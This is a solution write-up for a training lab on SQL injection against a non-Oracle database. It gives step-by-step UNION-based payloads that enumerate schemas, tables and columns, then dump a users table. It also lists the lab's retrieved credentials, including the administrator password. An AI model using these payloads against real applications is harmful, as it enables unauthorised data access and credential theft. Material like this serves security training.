# Lab: SQL injection attack, listing the database contents on non-Oracle databases

### Instructions

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user. 

### Solution

Testing the `category` parameter, we find there are two columns:

```sql
/filter?category=Gifts' union select null,null-- -
```

We can view the databases with:

```sql
/filter?category=Gifts' union select null,schema_name from information_schema.schemata-- -
```

Which returns:

information_schema
public
pg_catalog

We can query the tables in the `public` DB with:

```sql
/filter?category=Gifts' union select null,table_name from INFORMATION_SCHEMA.TABLES where table_schema = 'public'-- -
```

Which returns:

products
users_aflknr

Let's inspect the columns in the `users_aflknr` table:

```sql
/filter?category=Gifts' union select null,column_name from INFORMATION_SCHEMA.COLUMNS where table_name = 'users_aflknr'-- -
```

password_tovvju
username_jycaca


We can view these with: 

```sql
/filter?category=Gifts' union select username_jycaca,password_tovvju from public.users_aflknr-- -
```

Which gives us the following credentials:

administrator
ptk35fyimx98037xxezh
wiener
aqtdwwjhhay2wvezuzvv
carlos
4fm87pdorsnc8ra0v4o6

The administrator credentials can be used to login to the app, finishing the lab.